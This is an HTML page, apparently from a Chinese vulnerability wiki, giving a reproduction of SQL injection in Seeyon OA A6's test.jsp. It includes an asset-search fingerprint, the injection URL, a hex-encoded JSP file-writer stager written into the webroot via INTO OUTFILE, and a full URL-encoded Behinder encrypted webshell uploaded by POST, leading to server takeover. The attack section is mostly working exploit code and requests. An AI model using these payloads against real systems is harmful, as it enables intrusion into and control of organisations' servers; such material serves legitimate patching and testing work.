@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20test.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>致远OA A6 test.jsp SQL注入漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u81f4\u8fdcOA A6 test.jsp SQL\u6ce8\u5165\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u7f51\u7edc\u6d4b\u7ed8", url: "#_3" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E8%87%B4%E8%BF%9COA%20A8%20htmlofficeservlet%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E8%87%B4%E8%BF%9COA%20A8%20htmlofficeservlet%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        致远OA A8 htmlofficeservlet 任意文件上传漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E8%87%B4%E8%BF%9COA%20A6%20setextno.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E8%87%B4%E8%BF%9COA%20A6%20setextno.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        致远OA A6 setextno.jsp SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="oa-a6-testjsp-sql">致远OA A6 test.jsp SQL注入漏洞<a class="headerlink" href="#oa-a6-testjsp-sql" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>致远OA A6 test.jsp 存在sql注入漏洞，并可以通过注入写入webshell文件控制服务器</p>
+<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p><a-checkbox checked>致远OA A6</a-checkbox></br></p>
+<h2 id="_3">网络测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p><a-checkbox checked>title="致远A8+协同管理软件.A6"</a-checkbox></br></p>
+<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p>访问URL</p>
+<div class="highlight"><pre><span></span><code>http://xxx.xxx.xxx.xxx/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=(SELECT%20database())
+</code></pre></div>
+<p><img alt="img" src="../../../.vuepress/public/img/zhiyuan-25.png" /></p>
+<p>返回了当前使用的数据库, 要想写入shell需要知道写入的路径</p>
+<p><img alt="img" src="../../../.vuepress/public/img/zhiyuan-26.png" /></p>
+<p>这里得到路径 <code>D:\Program Files\UFseeyon\OA\mysql\bin..\</code></p>
+<p>通过 into outfile 写入文件，这里因为 jsp木马存在特殊符号，使用 hex编码 上传允许文件上传的jsp文件</p>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;%</span><span class="k">if</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">getParameter</span><span class="p">(</span><span class="ss">&quot;f&quot;</span><span class="p">)</span><span class="o">!=</span><span class="k">null</span><span class="p">)(</span><span class="k">new</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="n">io</span><span class="p">.</span><span class="n">FileOutputStream</span><span class="p">(</span><span class="n">application</span><span class="p">.</span><span class="n">getRealPath</span><span class="p">(</span><span class="ss">&quot;\\&quot;</span><span class="p">)</span><span class="o">+</span><span class="n">request</span><span class="p">.</span><span class="n">getParameter</span><span class="p">(</span><span class="ss">&quot;f&quot;</span><span class="p">))).</span><span class="k">write</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">getParameter</span><span class="p">(</span><span class="ss">&quot;t&quot;</span><span class="p">).</span><span class="n">getBytes</span><span class="p">());</span><span class="o">%&gt;</span>
+
+<span class="n">HEX编码</span>
+
+<span class="mi">3</span><span class="n">C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C5C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="o">/</span><span class="n">yyoa</span><span class="o">/</span><span class="n">common</span><span class="o">/</span><span class="n">js</span><span class="o">/</span><span class="n">menu</span><span class="o">/</span><span class="n">test</span><span class="p">.</span><span class="n">jsp</span><span class="o">?</span><span class="n">doType</span><span class="o">=</span><span class="mi">101</span><span class="o">&amp;</span><span class="n">S1</span><span class="o">=</span><span class="k">select</span><span class="o">%</span><span class="mi">20</span><span class="n">unhex</span><span class="p">(</span><span class="o">%</span><span class="mi">273</span><span class="n">C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E</span><span class="o">%</span><span class="mi">27</span><span class="p">)</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">20</span><span class="k">into</span><span class="o">%</span><span class="mi">20</span><span class="n">outfile</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">27</span><span class="n">E</span><span class="p">:</span><span class="o">/</span><span class="n">Program</span><span class="w"> </span><span class="n">Files</span><span class="o">/</span><span class="n">UFseeyon</span><span class="o">/</span><span class="n">OA</span><span class="o">/</span><span class="n">tomcat</span><span class="o">/</span><span class="n">webapps</span><span class="o">/</span><span class="n">yyoa</span><span class="o">/</span><span class="n">test_upload</span><span class="p">.</span><span class="n">jsp</span><span class="o">%</span><span class="mi">27</span>
+</code></pre></div>
+<p><img alt="img" src="../../../.vuepress/public/img/zhiyuan-27.png" /></p>
+<p>显示上图则上传成功，访问 test_upload.jsp 为空白不报错页面不存在就是上传成功</p>
+<p>在发送请求包上传webshell，这里上传冰蝎</p>
+<p><img alt="img" src="../../../.vuepress/public/img/zhiyuan-28.png" /></p>
+<div class="highlight"><pre><span></span><code>POST /yyoa/peiqi_upload.jsp?f=testwebshell.jsp
+
+t=%3C%25%40page%20import%3D%22java.util.*%2Cjavax.crypto.*%2Cjavax.crypto.spec.*%22%25%3E%3C%25!class%20U%20extends%20ClassLoader%7BU(ClassLoader%20c)%7Bsuper(c)%3B%7Dpublic%20Class%20g(byte%20%5B%5Db)%7Breturn%20super.defineClass(b%2C0%2Cb.length)%3B%7D%7D%25%3E%3C%25if%20(request.getMethod().equals(%22POST%22))%7BString%20k%3D%22e45e329feb5d925b%22%3Bsession.putValue(%22u%22%2Ck)%3BCipher%20c%3DCipher.getInstance(%22AES%22)%3Bc.init(2%2Cnew%20SecretKeySpec(k.getBytes()%2C%22AES%22))%3Bnew%20U(this.getClass().getClassLoader()).g(c.doFinal(new%20sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3B%7D%25%3E
+</code></pre></div>
+<p>连接木马</p>
+<p><img alt="img" src="../../../.vuepress/public/img/zhiyuan-29.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E8%87%B4%E8%BF%9COA%20A8%20htmlofficeservlet%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E8%87%B4%E8%BF%9COA%20A8%20htmlofficeservlet%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        致远OA A8 htmlofficeservlet 任意文件上传漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E8%87%B4%E8%BF%9COA%20A6%20setextno.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E8%87%B4%E8%BF%9COA%20A6%20setextno.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        致远OA A6 setextno.jsp SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
